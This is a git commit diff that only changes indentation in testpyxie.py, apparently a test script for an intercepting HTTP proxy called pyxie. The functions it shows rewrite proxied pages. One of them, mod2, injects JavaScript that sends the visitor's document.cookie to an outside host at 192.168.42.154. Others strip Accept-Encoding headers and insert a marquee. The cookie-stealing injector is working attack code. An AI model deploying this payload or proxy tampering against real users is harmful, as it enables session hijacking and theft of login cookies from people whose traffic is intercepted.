b7b177c8ab2f365032162cd325149e351bdd9775
Gabe Pike <gpike75@gmail.com>
2013-06-03 12:32:27 -0700

    fix spacing in testpyxie

--- testpyxie.py
+++ testpyxie.py
@@ -10,38 +10,38 @@ import config
 
 def mod1(data):
 
-  return re.sub(r'Accept-Encoding:.*\r\n', '', data.decode('utf8', 'ignore')).encode('utf8')
+    return re.sub(r'Accept-Encoding:.*\r\n', '', data.decode('utf8', 'ignore')).encode('utf8')
 
 def mod2(data):
 
-  javascript = '<script>var lkja=document.createElement("img");lkja.src="http://192.168.42.154/index.php?c="+encodeURIComponent(document.cookie);document.getElementsByTagName("body")[0].appendChild(lkja);</script>'
-  m = data.replace('</body>', javascript+"</body>")
-  return m
+    javascript = '<script>var lkja=document.createElement("img");lkja.src="http://192.168.42.154/index.php?c="+encodeURIComponent(document.cookie);document.getElementsByTagName("body")[0].appendChild(lkja);</script>'
+    m = data.replace('</body>', javascript+"</body>")
+    return m
 
 def mod3(data):
 
-  javascript = '<marquee>huehuehuehuehuehuehuehuehuehuehuehuehuehuehue</marquee>'
-  print(data.replace('</body>', "%s</body>" % javascript))
-  return data.replace('</body>', "%s</body>" % javascript)
+    javascript = '<marquee>huehuehuehuehuehuehuehuehuehuehuehuehuehuehue</marquee>'
+    print(data.replace('</body>', "%s</body>" % javascript))
+    return data.replace('</body>', "%s</body>" % javascript)
 
 def mod4(data):
 
-  return data.replace('foobar', 'barfoo')
+    return data.replace('foobar', 'barfoo')
 
 def main():
 
-  try:
-    config.modifiers.append(modifier.CustomModifier(mod1))
-    """
-    pyxie.add_modifier(pyxie.CustomModifier(mod2))
-    pyxie.add_modifier(pyxie.CustomModifier(mod3))
-    pyxie.add_modifier(pyxie.CustomModifier(mod4))
-    """
-    pyxie.start()
-  except KeyboardInterrupt as e:
-    print(e)
-    pyxie.stop()
-    sys.exit(0)
+    try:
+        config.modifiers.append(modifier.CustomModifier(mod1))
+        """
+        pyxie.add_modifier(pyxie.CustomModifier(mod2))
+        pyxie.add_modifier(pyxie.CustomModifier(mod3))
+        pyxie.add_modifier(pyxie.CustomModifier(mod4))
+        """
+        pyxie.start()
+    except KeyboardInterrupt as e:
+        print(e)
+        pyxie.stop()
+        sys.exit(0)
 
 if __name__ == "__main__":
-  sys.exit(main())
+    sys.exit(main())
